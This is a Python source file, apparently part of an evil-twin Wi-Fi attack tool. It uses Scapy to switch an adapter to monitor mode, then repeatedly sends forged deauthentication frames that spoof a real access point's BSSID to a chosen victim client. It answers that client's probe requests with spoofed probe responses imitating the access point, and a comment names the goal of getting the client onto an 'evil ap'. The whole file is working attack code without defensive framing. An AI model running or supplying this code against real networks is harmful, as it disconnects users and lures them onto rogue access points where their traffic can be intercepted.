# =====================================================================
#                    INJECTOR SETUP
# =====================================================================   
"""
1. set the adapter to monitor mode
2. sending disas packets
"""
from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt, Dot11Disas, RadioTap,Dot11Deauth, sendp, Dot11ProbeResp
import time
import subprocess
import sys
import os
from contextlib import redirect_stdout, redirect_stderr

def set_injector_adapter(interface_name, channel):
    print(f"[*] Setting {interface_name} to act as Injector...")
    try:
        subprocess.run(["sudo", "ip", "link", "set", interface_name, "down"], check=True)
        subprocess.run(["sudo", "iw", interface_name, "set", "type", "monitor"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", interface_name, "up"], check=True)
        
        subprocess.run(["sudo", "iw", "dev", interface_name, "set", "channel", str(channel)], check=True)
        
    except subprocess.CalledProcessError as e:
        cmd_list = getattr(e, 'cmd', [])
        if "channel" in cmd_list:
            print(f"[!] Channrel error while setting {interface_name} as injector")
            sys.exit(1)
        else:
            print(f"[!] Changing {interface_name} to monitor mode failed with the error: {e}")
            sys.exit(1)

def wait_for_probe_timeout(interface_name,victim_addr):
    packets = sniff(iface=interface_name, filter=f"wlan type mgt subtype probe-req and wlan addr2 {victim_addr}",count=1, store=1,timeout=2)
    if packets:
        return packets[0]
    return None
    

def send_disas_packets(interface_name, victim, ap, stop_injection):
    victim_addr = victim['bssid']
    bssid = ap['bssid']
    ssid = ap['ssid']
    rates = b"\x82\x84\x8b\x96" if ap['rates'] == "Unknown" else ap['rates']
    dot11_layer = Dot11(addr1=victim_addr, addr2=bssid, addr3=bssid)
    dot11_layer_prob = Dot11(type=0, subtype=5, addr1=victim_addr, addr2=bssid, addr3=bssid)
    #disas_layer = Dot11Disas(reason=7)
    #dis_packet = RadioTap() / dot11_layer / disas_layer
    deauth_layer = Dot11Deauth(reason=7)
    deauth_packet = RadioTap() / dot11_layer / deauth_layer

    probe_resp_fixed = Dot11ProbeResp(timestamp=0,beacon_interval=100,cap="ESS")

    rates = b"\x82\x84\x8b\x96" if ap['rates'] == "Unknown" else ap['rates']
    probe_response = (
    RadioTap() / 
    dot11_layer_prob / 
    probe_resp_fixed / 
    Dot11Elt(ID=0, info=ssid) / 
    Dot11Elt(ID=1, info=rates)
    )
    # ID = SSID = 0, ID=1=rates, ID=50 es rates, 48 =security
    if ap['esrates']:
        probe_response /= Dot11Elt(ID=50, info=ap['esrates'])
    probe_response /= Dot11Elt(ID=48, info=ap['security'])

    
    print("[*] Started sending disassociation and deauthentication packets in the background ")
    while not stop_injection.is_set():
        try:
            #sendp(dis_packet, iface=interface_name, count=10,inter=0.1, verbose=False)
            sendp(deauth_packet, iface=interface_name,count=5,inter=0.1, verbose=False)
        # add option for injection thread to end when client already connected to evil ap
            time.sleep(1)
            probe_req = wait_for_probe_timeout(interface_name, victim_addr)
            if probe_req is None:
                continue
            sendp(probe_response, iface=interface_name, verbose=False)

        except Exception as e:
            print(f"[!] Error in injection loop: {e}")
        if stop_injection.wait(0.2):
            break    
    print("[*] Injection thread cleanly stopped")

